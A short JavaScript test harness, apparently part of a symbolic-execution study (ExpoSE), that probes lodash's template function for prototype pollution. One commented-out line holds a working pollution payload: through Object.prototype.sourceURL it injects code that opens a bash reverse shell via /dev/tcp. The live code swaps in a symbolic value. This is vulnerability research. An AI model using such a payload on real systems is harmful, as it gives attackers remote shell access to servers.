/**
 * To test on template engines
 * 
 * 1/ require the direct file which contains exposed API rather than whole module
 *    this step helps us limit the file that need instrument
 *    TODO: we could use a configure file to tell jalangji which program slice are need for instrument and analysis
 * 2/ set the undefined property as pure symbolic object
 * 3/ check whether the 
 *  
 */
const lodash = require('lodash')
const fs = require('fs')

var S$ = require('../../../lib/S$')

/**
 * Polluted Payload
 */
// Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"

// make it symbolic
Object.prototype.sourceURL = S$.pureSymbol('sourceURL_undef')

/**
 * Exported function call
 */
fs.readFile('/home/ubuntu/ExpoSE/TemplateEngines/lodash/template.ejs', (err, content) => {
    let compiled = lodash.template(content)
})


